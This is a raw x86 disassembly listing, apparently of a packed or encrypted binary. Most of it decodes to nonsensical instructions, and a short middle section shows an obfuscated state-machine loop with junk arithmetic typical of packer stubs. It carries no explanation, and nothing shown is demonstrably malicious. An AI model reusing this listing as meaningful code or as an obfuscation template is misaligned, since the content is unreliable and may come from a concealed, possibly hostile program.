  40bd4f:	stos   DWORD PTR es:[edi],eax
  40bd50:	fbstp  TBYTE PTR [eax+0x6a]
  40bd53:	mov    DWORD PTR [edi-0x22],ebp
  40bd56:	mov    ch,dh
  40bd58:	mov    ebx,0x8d3f285b
  40bd5d:	push   cs
  40bd5e:	sbb    al,0x6
  40bd60:	mov    dh,0xb0
  40bd62:	data16 addr16 (bad) 
  40bd65:	scas   al,BYTE PTR es:[edi]
  40bd66:	mov    DWORD PTR [ecx-0x9],ebp
  40bd69:	loopne 0x40bd3f
  40bd6b:	mov    al,0x6b
  40bd6d:	or     bl,dh
  40bd6f:	sub    ebp,ebx
  40bd71:	icebp  
  40bd72:	mov    ch,0xa5
  40bd74:	push   edi
  40bd75:	jno    0x40bda8
  40bd77:	pop    ebp
  40bd78:	ins    DWORD PTR es:[edi],dx
  40bd79:	nop
  40bd7a:	cmp    esi,DWORD PTR ds:0xd96648ba
  40bd80:	and    BYTE PTR ss:[ecx+0x7577eb7],0xb0
  40bd88:	jne    0x40bd42
  40bd8a:	fistp  WORD PTR [edx]
  40bd8c:	xchg   edx,eax
  40bd8d:	test   esi,edx
  40bd8f:	pop    eax
  40bd90:	ss ss xchg ecx,eax
  40bd93:	mov    dh,0x9
  40bd95:	sbb    eax,0x9e03620
  40bd9a:	aaa    
  40bd9b:	or     ch,dl
  40bd9d:	jge    0x40bdc6
  40bd9f:	and    DWORD PTR [esp+ecx*2+0x671e8cc],esi
  40bda6:	inc    edi
  40bda7:	aam    0x6a
  40bda9:	mov    eax,ds:0x79fe575e
  40bdae:	dec    esi
  40bdaf:	leave  
  40bdb0:	push   esi
  40bdb1:	push   esp
  40bdb2:	aad    0xde
  40bdb4:	ret    0x243f
  40bdb7:	xlat   BYTE PTR ds:[ebx]
  40bdb8:	int    0x98
  40bdba:	add    edi,ebp
  40bdbc:	lds    eax,FWORD PTR [eax+esi*1+0x64]
  40bdc0:	gs out dx,al
  40bdc2:	sub    DWORD PTR [eax],esi
  40bdc4:	mov    bl,0xa4
  40bdc6:	jae    0x40be02
  40bdc8:	fisubr WORD PTR [ebx+0xad69815]
  40bdce:	add    DWORD PTR [edi+0x6ea3c4d1],0x96ed115d
  40bdd8:	push   ecx
  40bdd9:	mov    dl,0x34
  40bddb:	imul   eax,DWORD PTR ds:[ebp+eiz*2+0x7],0x3a
  40bde1:	xchg   esi,eax
  40bde2:	jmp    0x8519:0x789590d0
  40bde9:	std    
  40bdea:	push   0x108931f5
  40bdef:	add    al,0x6
  40bdf1:	inc    esp
  40bdf2:	push   edx
  40bdf3:	pop    ebx
  40bdf4:	sbb    ecx,esp
  40bdf6:	jmp    ebp
  40bdf8:	(bad)  
  40bdf9:	and    al,0x6
  40bdfb:	jle    0x40be00
  40bdfd:	std    
  40bdfe:	push   ss
  40bdff:	test   al,0x92
  40be01:	stc    
  40be02:	cmp    dl,bl
  40be04:	xor    cl,BYTE PTR [ebp+0x5a]
  40be07:	push   0x332ef884
  40be0c:	xchg   ebp,eax
  40be0d:	dec    ecx
  40be0e:	sub    al,0xbd
  40be10:	mov    bh,0x5c
  40be12:	cmp    eax,0x8c8822e8
  40be17:	out    dx,al
  40be18:	fiadd  WORD PTR [ebp+0x1bc5515]
  40be1e:	cmp    edx,edi
  40be20:	jecxz  0x40be23
  40be22:	repz mov edx,0x4a2c02fd
  40be28:	xor    eax,0xb20265ba
  40be2d:	push   ds
  40be2e:	jecxz  0x40be00
  40be30:	pop    ebp
  40be31:	out    dx,al
  40be32:	add    al,0xf0
  40be34:	punpcklbw mm1,DWORD PTR [ecx]
  40be37:	popa   
  40be38:	stos   BYTE PTR es:[edi],al
  40be39:	mov    ebp,0x25e217c6
  40be3e:	and    al,0x44
  40be40:	ss push ebx
  40be42:	adc    ebx,DWORD PTR [esi+0x20]
  40be45:	xchg   esp,eax
  40be46:	jno    0x40be9f
  40be48:	xor    al,0xcb
  40be4a:	bound  ecx,QWORD PTR [ecx-0x3687179a]
  40be50:	cld    
  40be51:	xchg   DWORD PTR [ebx],edi
  40be53:	mov    ebp,0x1cb67e7c
  40be58:	shr    DWORD PTR [ebx+0x6882db91],1
  40be5e:	pop    ebp
  40be5f:	stc    
  40be60:	fcomp  DWORD PTR [ecx-0xf]
  40be63:	fs xchg edi,eax
  40be65:	and    al,0x82
  40be67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be68:	sahf   
  40be69:	in     eax,0xaa
  40be6b:	sbb    BYTE PTR [edi-0x3d],cl
  40be6e:	push   ss
  40be6f:	sbb    ebp,esi
  40be71:	shr    DWORD PTR [eax+eax*4],cl
  40be74:	and    edx,eax
  40be76:	call   0x26f3:0xf3f9fb64
  40be7d:	jl     0x40be67
  40be7f:	daa    
  40be80:	and    edx,DWORD PTR [eax]
  40be82:	dec    esp
  40be83:	stos   DWORD PTR es:[edi],eax
  40be84:	xchg   ebp,eax
  40be85:	add    DWORD PTR [eax],0x8932ae5d
  40be8b:	push   esi
  40be8c:	jmp    DWORD PTR [edi]
  40be8e:	lods   eax,DWORD PTR ds:[esi]
  40be8f:	ret    0x7c1e
  40be92:	stos   BYTE PTR es:[edi],al
  40be93:	mov    edx,0x8d180d1c
  40be98:	shl    al,1
  40be9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be9b:	push   esi
  40be9c:	sub    dl,BYTE PTR [ebp-0x34]
  40be9f:	mov    WORD PTR [edi-0x5e7ccc54],?
  40bea5:	adc    ah,BYTE PTR [ecx]
  40bea7:	xor    eax,0xd2d03aea
  40beac:	add    BYTE PTR [esi+0x7d8be069],dh
  40beb2:	or     BYTE PTR [ecx+0x424435],ah
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	sub    ch,ch
  40c014:	data16 fcmovnbe st,st(4)
  40c017:	jmp    0x5f5a3a96
  40c01c:	jp     0x40c098
  40c01e:	or     eax,0x53f0dd46
  40c023:	mov    al,0x70
  40c025:	leave  
  40c026:	mov    ebx,0x9b8d5385
  40c02b:	and    cl,BYTE PTR [edi]
  40c02d:	out    0xd,al
  40c02f:	icebp  
  40c030:	cmp    dh,ch
  40c032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c033:	adc    esi,DWORD PTR [ebx]
  40c035:	jnp    0x8be34c8b
  40c03b:	loop   0x40c0a4
  40c03d:	nop
  40c03e:	or     ebx,edx
  40c040:	ja     0x40c02c
  40c042:	push   esp
  40c043:	stos   DWORD PTR es:[edi],eax
  40c044:	and    bl,ch
  40c046:	push   0x382010a2
  40c04b:	or     dl,dl
  40c04d:	mov    dl,0x39
  40c04f:	ret    0x454
  40c052:	xchg   esp,eax
  40c053:	inc    esp
  40c054:	div    BYTE PTR [edx-0x5e3fd0d0]
  40c05a:	pop    ecx
  40c05b:	dec    edx
  40c05c:	cwde   
  40c05d:	ins    DWORD PTR es:[edi],dx
  40c05e:	add    al,0x9e
  40c060:	retf   0x1893
  40c063:	retf   
  40c064:	out    dx,eax
  40c065:	sbb    eax,0xf849789c
  40c06a:	imul   ebp,DWORD PTR [ecx-0x33f21879],0x16
  40c071:	sub    al,BYTE PTR [ebx+0x19]
  40c074:	daa    
  40c075:	jbe    0x40c07e
  40c077:	mov    bl,0xf5
  40c079:	iret   
  40c07a:	rcr    DWORD PTR [ebp+0xc],0x80
  40c07e:	es mov cl,0xcc
  40c081:	popf   
  40c082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c083:	and    esi,DWORD PTR [ebx+0x65]
  40c086:	pushf  
  40c087:	dec    edi
  40c088:	lods   al,BYTE PTR ds:[esi]
  40c089:	sti    
  40c08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08b:	xchg   ecx,eax
  40c08c:	(bad)  
  40c08d:	popa   
  40c08e:	cwde   
  40c08f:	dec    DWORD PTR [edi+0x3c]
  40c092:	xor    eax,0x2cb178d3
  40c097:	dec    esp
  40c098:	sub    BYTE PTR [ebp-0x54],al
  40c09b:	rcr    DWORD PTR [edx],0x30
  40c09e:	cmp    al,0xf9
  40c0a0:	scas   al,BYTE PTR es:[edi]
  40c0a1:	lea    ebx,[ecx]
  40c0a3:	sub    BYTE PTR [esi+edx*2],cl
  40c0a6:	in     al,dx
  40c0a7:	lods   al,BYTE PTR ds:[esi]
  40c0a8:	(bad)  
  40c0a9:	jbe    0x40c118
  40c0ab:	(bad)  
  40c0ac:	jl     0x40c0df
  40c0ae:	add    eax,edi
  40c0b0:	test   DWORD PTR ds:0x61f9d20b,esp
  40c0b6:	sbb    bh,dh
  40c0b8:	push   cs
  40c0b9:	pop    edx
  40c0ba:	add    DWORD PTR [edx],ecx
  40c0bc:	cwde   
  40c0bd:	xchg   edx,eax
  40c0be:	cmp    DWORD PTR [eax],0xd9724a1d
  40c0c4:	popf   
  40c0c5:	aas    
  40c0c6:	ja     0x40c0bd
  40c0c8:	pop    eax
  40c0c9:	retf   
  40c0ca:	push   edx
  40c0cb:	and    BYTE PTR ds:0x617be79b,cl
  40c0d1:	das    
  40c0d2:	es pop ecx
  40c0d4:	and    eax,edx
  40c0d6:	adc    ecx,DWORD PTR [esi]
  40c0d8:	xchg   esp,eax
  40c0d9:	call   0x6a190635
  40c0de:	xlat   BYTE PTR ds:[ebx]
  40c0df:	dec    esi
  40c0e0:	mov    edx,cs
  40c0e2:	inc    ebx
  40c0e3:	xadd   DWORD PTR [ebp-0x76],edx
  40c0e7:	shl    DWORD PTR [edi],0xff
  40c0ea:	rcr    DWORD PTR [ebp-0x65390873],0x81
  40c0f1:	ret    0xad57
  40c0f4:	repnz mov ds:0x6e66f9ae,eax
  40c0fa:	sbb    dl,ah
  40c0fc:	lea    edi,[edx-0x45]
  40c0ff:	and    eax,0x9d346250
  40c104:	fdiv   DWORD PTR [ebx-0x15]
  40c107:	mov    dh,0xec
  40c109:	clc    
  40c10a:	rol    DWORD PTR [edi],0xe
  40c10d:	scas   eax,DWORD PTR es:[edi]
  40c10e:	pop    edx
  40c10f:	ins    BYTE PTR es:[edi],dx
  40c110:	pop    ss
  40c111:	sahf   
  40c112:	adc    al,0x65
  40c114:	iret   
  40c115:	adc    DWORD PTR [ecx-0x3c552576],ebp
  40c11b:	shr    ch,1
  40c11d:	pusha  
  40c11e:	mov    WORD PTR [esp+edx*8],ss
  40c121:	ret    0x26dd
  40c124:	push   edi
  40c125:	(bad)  
  40c126:	fwait
  40c127:	dec    edx
  40c128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c129:	pushf  
  40c12a:	jb     0x40c0f4
  40c12c:	dec    edi
  40c12d:	lea    esi,[eax+0x62]
  40c130:	and    bh,BYTE PTR [ebp-0xa9ac1]
  40c136:	add    BYTE PTR [eax+ebx*4],bl
  40c139:	xor    dh,cl
  40c13b:	adc    eax,0xf54c93af
  40c140:	sub    eax,0x843d7590
  40c145:	mov    ch,0x57
  40c147:	xchg   ecx,eax
  40c148:	xor    edx,DWORD PTR [eax-0x26]
  40c14b:	test   al,0xde
  40c14d:	stc    
  40c14e:	loop   0x40c177
  40c150:	(bad)  
  40c151:	outs   dx,DWORD PTR ds:[esi]
  40c152:	sbb    eax,0x4599dd7f
  40c157:	sbb    DWORD PTR [ebx+ebp*2+0x71],esp
  40c15b:	xchg   ebp,eax
  40c15c:	or     esp,edx
  40c15e:	add    BYTE PTR [eax+ebp*2],cl
  40c161:	xor    eax,0xa4f85804
  40c166:	test   BYTE PTR [ecx+ebx*2],bl
  40c169:	sbb    DWORD PTR [edx+edx*8+0x5dc1a02e],eax
  40c170:	push   0xffffff84
  40c172:	hlt    
  40c173:	xchg   esp,eax
  40c174:	xor    dh,ch
  40c176:	in     al,0xee
  40c178:	pop    edx
  40c179:	cmp    BYTE PTR [eax+0x73],cl
  40c17c:	repnz sahf 
  40c17e:	push   0x16
  40c180:	mov    eax,ds:0x253b842b
  40c185:	mov    ch,0xd5
  40c187:	jmp    0x40c1a7
  40c189:	or     BYTE PTR [ebx+0x54],dl
  40c18c:	pop    esp
  40c18d:	and    ah,BYTE PTR [ebp-0x58]
  40c190:	add    al,0x5c
  40c192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c193:	popa   
  40c194:	jbe    0x40c17b
  40c196:	xor    dl,BYTE PTR ds:0x2a9d79e1
  40c19c:	mov    ax,ds:0x9ca320c2
  40c1a2:	lock mov dh,0xb6
  40c1a5:	sub    ebx,DWORD PTR [ebp+eiz*4-0x1aeed66]
  40c1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ad:	jmp    0x40c160
  40c1af:	sbb    dh,dl
  40c1b1:	icebp  
  40c1b2:	cmp    al,0xce
  40c1b4:	jl     0x40c22b
  40c1b6:	or     eax,0x5151f51c
  40c1bb:	fucomi st,st(2)
  40c1bd:	repz (bad) [edx]
  40c1c0:	pop    ebx
  40c1c1:	sub    eax,0x8782f5d0
  40c1c6:	imul   esp,DWORD PTR [eax+0x49],0x44
  40c1ca:	repz cli 
  40c1cc:	hlt    
  40c1cd:	xchg   ebp,eax
  40c1ce:	ins    DWORD PTR es:[edi],dx
  40c1cf:	in     al,dx
  40c1d0:	jg     0x40c19f
  40c1d2:	test   BYTE PTR [ebp-0xc11c393],dh
  40c1d8:	push   es
  40c1d9:	in     eax,0xfb
  40c1db:	mov    ds:0xf7e9a256,al
  40c1e0:	pop    ebp
  40c1e1:	xor    BYTE PTR [esi],ch
  40c1e3:	mov    ?,WORD PTR [eax+0x3dd1f58e]
  40c1e9:	pop    esp
  40c1ea:	leave  
  40c1eb:	sbb    eax,0x5fab19c7
  40c1f0:	inc    edx
  40c1f1:	xchg   ebx,eax
  40c1f2:	add    al,0xeb
  40c1f4:	lods   al,BYTE PTR ds:[esi]
  40c1f5:	cmp    al,0xa7
  40c1f7:	sar    dl,cl
  40c1f9:	adc    al,BYTE PTR [esi-0x12]
  40c1fc:	sub    ecx,DWORD PTR [ebx+0x7d5606d8]
  40c202:	lock dec edi
  40c204:	repz fnstsw WORD PTR [ebx-0x59fd7118]
  40c20b:	mov    dl,0x2a
  40c20d:	mov    ch,0x55
  40c20f:	push   edx
  40c210:	jg     0x40c229
  40c212:	(bad)  
  40c214:	inc    eax
  40c215:	jg     0x40c23a
  40c217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c218:	jmp    0x897b:0xe946ffd9
  40c21f:	fcmovne st,st(4)
  40c221:	es std 
  40c223:	or     esp,eax
  40c225:	dec    ecx
  40c226:	mov    eax,ds:0x3f7aa915
  40c22b:	pusha  
  40c22c:	bound  esi,QWORD PTR [ecx-0x1d]
  40c22f:	xor    DWORD PTR [edx-0x51],eax
  40c232:	inc    ebx
  40c233:	repz daa 
  40c235:	inc    edx
  40c236:	mov    esp,0xa1804a60
  40c23b:	adc    ecx,esi
  40c23d:	xchg   esp,eax
  40c23e:	ss loop 0x40c27b
  40c241:	test   eax,0x2c983fc9
  40c246:	sub    DWORD PTR [edx+eax*4],ebx
  40c249:	addr16 loopne 0x40c27b
  40c24c:	addr16 pop ecx
  40c24e:	or     esi,DWORD PTR ds:0xadfb14cd
  40c254:	mov    ax,ds:0x1b1ec2ab
  40c25a:	dec    esi
  40c25b:	pop    ds
  40c25c:	and    ebp,DWORD PTR [edi-0x2b]
  40c25f:	xlat   BYTE PTR ds:[ebx]
  40c260:	inc    esp
  40c261:	aaa    
  40c262:	adc    al,0x8a
  40c264:	into   
  40c265:	(bad)  [eax-0x3614958d]
  40c26b:	or     esp,DWORD PTR [esp+eiz*2-0x3c]
  40c26f:	push   ecx
  40c270:	mov    eax,DWORD PTR [edx-0x2e6976b8]
  40c276:	push   edx
  40c277:	add    DWORD PTR [ebp+0x56],0xffffff90
  40c27b:	in     eax,0x27
  40c27d:	sti    
  40c27e:	pop    ebp
  40c27f:	mov    ch,0xec
  40c281:	add    al,0x32
  40c283:	scas   eax,DWORD PTR es:[edi]
  40c284:	stos   DWORD PTR es:[edi],eax
  40c285:	sub    al,0x5e
  40c287:	xlat   BYTE PTR ds:[ebx]
  40c288:	leave  
  40c289:	scas   eax,DWORD PTR es:[edi]
  40c28a:	les    edi,FWORD PTR [ecx-0x74]
  40c28d:	fist   WORD PTR [edi]
  40c28f:	out    dx,al
  40c290:	push   edx
  40c291:	test   al,0xaf
  40c293:	sar    al,cl
  40c295:	add    DWORD PTR [eax+0x21],edi
  40c298:	test   BYTE PTR [eax+edx*2-0x6c3864fb],0x57
  40c2a0:	and    BYTE PTR [eax-0x19bee9f8],bh
  40c2a6:	in     eax,0xdb
  40c2a8:	dec    ebx
  40c2a9:	rcl    DWORD PTR ds:0x3016903f,1
  40c2af:	xchg   BYTE PTR [ebx+0x2],ah
  40c2b2:	sbb    BYTE PTR [edx],dh
  40c2b4:	jmp    0x40c333
  40c2b6:	sbb    ch,dl
  40c2b8:	shl    dh,0xca
  40c2bb:	lahf   
  40c2bc:	addr16 pop ds
  40c2be:	retf   0xf187
  40c2c1:	xchg   BYTE PTR [ecx-0x22],cl
  40c2c4:	mov    eax,0xa37d7f44
  40c2c9:	adc    DWORD PTR [eax],ebx
  40c2cb:	enter  0x6281,0x77
  40c2cf:	pop    ecx
  40c2d0:	(bad)  
  40c2d1:	fwait
  40c2d2:	loopne 0x40c2f8
  40c2d4:	push   ebp
  40c2d5:	cmp    esi,DWORD PTR [esi]
  40c2d7:	outs   dx,DWORD PTR ds:[esi]
  40c2d8:	xor    al,0x33
  40c2da:	mov    al,0x25
  40c2dc:	mov    ecx,0xdf73cbdc
  40c2e1:	and    BYTE PTR [edx+ebp*4],ch
  40c2e4:	and    al,0x97
  40c2e6:	addr16 push es
  40c2e8:	test   al,0x9f
  40c2ea:	and    DWORD PTR [edx+0x5c],esp
  40c2ed:	loopne 0x40c2be
  40c2ef:	inc    ebp
  40c2f0:	inc    esi
  40c2f1:	outs   dx,BYTE PTR ds:[esi]
  40c2f2:	lahf   
  40c2f3:	and    DWORD PTR [esi-0x16],0xe1176690
  40c2fa:	aaa    
  40c2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2fc:	in     eax,0x86
  40c2fe:	stc    
  40c2ff:	ins    BYTE PTR es:[edi],dx
  40c300:	sti    
  40c301:	mov    eax,ds:0x703431b1
  40c306:	and    BYTE PTR [esi+0x4cc9a83a],bl
  40c30c:	fs xchg ecx,eax
  40c30e:	(bad)  
  40c30f:	lock lahf 
  40c311:	fidivr WORD PTR [edx-0x68b8518f]
  40c317:	sub    ebp,DWORD PTR [esi+0x2d]
  40c31a:	mov    dh,0x7d
  40c31c:	in     al,dx
  40c31d:	jg     0x40c2ec
  40c31f:	sbb    al,0x3d
  40c321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c322:	shl    edx,1
  40c324:	sbb    bh,al
  40c326:	sbb    eax,0x84346ba8
  40c32b:	inc    ebx
  40c32c:	xchg   ecx,eax
  40c32d:	in     eax,dx
  40c32e:	sbb    DWORD PTR fs:[eax+0x362b681e],edi
  40c335:	push   ebx
  40c336:	add    al,0xb6
  40c338:	add    al,0x58
  40c33a:	xchg   ebp,eax
  40c33b:	cmp    eax,0xcef2abe
  40c340:	sub    al,0x80
  40c342:	in     al,0xd3
  40c344:	mov    edi,DWORD PTR [eax+ebp*4-0x11]
  40c348:	xchg   ebp,eax
  40c349:	icebp  
  40c34a:	cmp    BYTE PTR [edi],bh
  40c34c:	sahf   
  40c34d:	out    0x94,eax
  40c34f:	test   eax,0x9376dd70
  40c354:	and    eax,ecx
  40c356:	outs   dx,BYTE PTR ds:[esi]
  40c357:	pop    ss
  40c358:	stc    
  40c359:	mov    bh,0x1d
  40c35b:	dec    eax
  40c35c:	in     eax,dx
  40c35d:	dec    edx
  40c35e:	sub    BYTE PTR [edx],al
  40c360:	aad    0x72
  40c362:	sub    cl,bl
  40c364:	mov    ah,0x86
  40c366:	xor    DWORD PTR gs:[eax+eiz*8+0x25],edx
  40c36b:	xor    BYTE PTR [edi],dh
  40c36d:	je     0x40c3e6
  40c36f:	ds test esp,ebp
  40c372:	loop   0x40c33a
  40c374:	inc    ecx
  40c375:	pusha  
  40c376:	lahf   
  40c377:	mov    edi,0x8f1ee434
  40c37c:	js     0x40c356
  40c37e:	(bad)  
  40c37f:	mov    esi,0xefe5bba4
  40c384:	(bad)  
  40c385:	call   0x6c2b1f58
  40c38a:	shl    BYTE PTR [edi],0xe
  40c38d:	(bad)  
  40c38e:	xor    dh,cl
  40c390:	sbb    ebx,eax
  40c392:	xchg   esi,eax
  40c393:	loopne 0x40c3d0
  40c395:	aas    
  40c396:	ret    0xdc
  40c399:	add    eax,0x9f310227
  40c39e:	daa    
  40c39f:	xor    BYTE PTR [edi-0x42],dh
  40c3a2:	retf   0xdd18
  40c3a5:	mov    es,esp
  40c3a7:	mov    ah,0x28
  40c3a9:	out    dx,al
  40c3aa:	test   BYTE PTR [esi],0x14
  40c3ad:	pop    ds
  40c3ae:	sbb    DWORD PTR [eax-0x1d923732],esi
  40c3b4:	loop   0x40c42c
  40c3b6:	mov    ds,WORD PTR [eax-0x2e4b68c0]
  40c3bc:	sbb    DWORD PTR [ecx],ebp
  40c3be:	aaa    
  40c3bf:	cwde   
  40c3c0:	add    ebx,DWORD PTR [esi]
  40c3c2:	fld    DWORD PTR [ebx-0x6c1119e5]
  40c3c8:	mov    ah,0x2b
  40c3ca:	xlat   BYTE PTR ds:[ebx]
  40c3cb:	fcomp  DWORD PTR [ecx]
  40c3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3ce:	xor    cl,BYTE PTR [edi+ebp*1-0x52]
  40c3d2:	ja     0x40c3a9
  40c3d4:	icebp  
  40c3d5:	shr    DWORD PTR [edi-0x46],cl
  40c3d8:	ja     0x40c457
  40c3da:	xchg   BYTE PTR [eax-0x205f2a09],ah
  40c3e0:	sub    BYTE PTR [edx-0x6bdd1f0e],0xfb
  40c3e7:	iret   
  40c3e8:	fisttp DWORD PTR [ebp+0x5e]
  40c3eb:	inc    esp
  40c3ec:	sbb    BYTE PTR [eax+0x51222e5e],bh
  40c3f2:	gs call 0x59e:0xfcdff923
  40c3fa:	mov    ecx,0x5cfc4bb4
  40c3ff:	and    BYTE PTR [edx+0x38],cl
  40c402:	push   es
  40c403:	fsubr  DWORD PTR [esi+ecx*4-0x60cab7f4]
  40c40a:	enter  0xbe9e,0x7c
  40c40e:	rcl    BYTE PTR [ecx],cl
  40c410:	pushf  
  40c411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c412:	icebp  
  40c413:	pusha  
  40c414:	mul    DWORD PTR [esp+edi*2]
  40c417:	xor    eax,0x3784c7da
  40c41c:	jecxz  0x40c461
  40c41e:	lods   al,BYTE PTR ds:[esi]
  40c41f:	(bad)  [ebx+ebx*1]
  40c422:	jge    0x40c480
  40c424:	push   ebp
  40c425:	mov    ecx,0xb1fd3779
  40c42a:	ja     0x40c4a4
  40c42c:	test   al,0xd0
  40c42e:	jle    0x40c499
  40c430:	dec    ebx
  40c431:	call   0x1634b193
  40c436:	xchg   edi,eax
  40c437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c438:	ins    BYTE PTR es:[edi],dx
  40c439:	imul   ebp,DWORD PTR [esi+0x10],0xffffffac
  40c43d:	cbw    
  40c43f:	cmp    eax,0x85e48bea
  40c444:	jnp    0x40c3e7
  40c446:	xor    DWORD PTR [eax-0x6f],esi
  40c449:	xchg   edx,eax
  40c44a:	shl    DWORD PTR [esi+0x3c99f20a],0x93
  40c451:	mov    cl,0x10
  40c453:	cmp    edx,DWORD PTR [ebx-0x5c]
  40c456:	into   
  40c457:	sbb    ebx,ebx
  40c459:	(bad)  
  40c45a:	mov    bh,0x11
  40c45c:	mov    eax,0x1503e282
  40c461:	dec    ebx
  40c462:	jnp    0x40c485
  40c464:	retf   
  40c465:	adc    DWORD PTR [edi+0x32],0xa6315b73
  40c46c:	mov    BYTE PTR [edi],bh
  40c46e:	inc    ebx
  40c46f:	mov    DWORD PTR [ebx-0x4deb29d0],edx
  40c475:	lods   al,BYTE PTR ds:[esi]
  40c476:	stos   DWORD PTR es:[edi],eax
  40c477:	sbb    ebp,ebp
  40c479:	js     0x40c4e0
  40c47b:	xchg   ebx,eax
  40c47c:	test   al,0xb3
  40c47e:	add    eax,0x695a20d3
  40c483:	sub    DWORD PTR [ecx+0x2fe15515],eax
  40c489:	cmp    eax,0x7526abda
  40c48e:	cli    
  40c48f:	test   esi,edx
  40c491:	in     al,0xb9
  40c493:	icebp  
  40c494:	std    
  40c495:	xor    ebp,DWORD PTR [esi+ebp*4+0x9ed3ce3]
  40c49c:	add    BYTE PTR [ebx+0x4b],bh
  40c49f:	pop    edi
  40c4a0:	pop    ss
  40c4a1:	add    BYTE PTR [ebx+0x68],dl
  40c4a4:	sbb    eax,0x53efa4b1
  40c4a9:	stos   BYTE PTR es:[edi],al
  40c4aa:	(bad)  
  40c4ab:	lock inc ecx
  40c4ad:	xor    eax,0x766cfb2a
  40c4b2:	inc    ebp
  40c4b3:	mov    ecx,0x953354fe
  40c4b8:	aad    0x29
  40c4ba:	pop    ebp
  40c4bb:	loopne 0x40c525
  40c4bd:	or     al,0x4
  40c4bf:	stc    
  40c4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c1:	dec    esi
  40c4c2:	fcom   DWORD PTR [edx+edx*2-0xd65c423]
  40c4c9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c4cb:	dec    esi
  40c4cc:	dec    edx
  40c4cd:	inc    ebx
  40c4cf:	hlt    
  40c4d0:	xor    esi,DWORD PTR [esi+0x369890c5]
  40c4d6:	std    
  40c4d7:	cld    
  40c4d8:	jne    0x40c4b1
  40c4da:	(bad)  
  40c4db:	sub    al,0x3e
  40c4dd:	add    BYTE PTR [esi+0x23],ch
  40c4e0:	hlt    
  40c4e1:	sub    dh,bl
  40c4e3:	popf   
  40c4e4:	or     al,BYTE PTR [ecx+0x63f73a03]
  40c4ea:	push   ebx
  40c4eb:	int    0x1e
  40c4ed:	into   
  40c4ee:	xor    dh,ah
  40c4f0:	and    eax,0xd3fad719
  40c4f5:	mov    ch,ch
  40c4f7:	pop    ss
  40c4f8:	cdq    
  40c4f9:	sar    DWORD PTR [ebx-0x2a93dd8d],cl
  40c4ff:	leave  
  40c500:	outs   dx,BYTE PTR ds:[esi]
  40c501:	lods   al,BYTE PTR ds:[esi]
  40c502:	mov    dh,0xef
  40c504:	fdiv   st,st(6)
  40c506:	dec    esi
  40c507:	jmp    0x5161:0x5d61882d
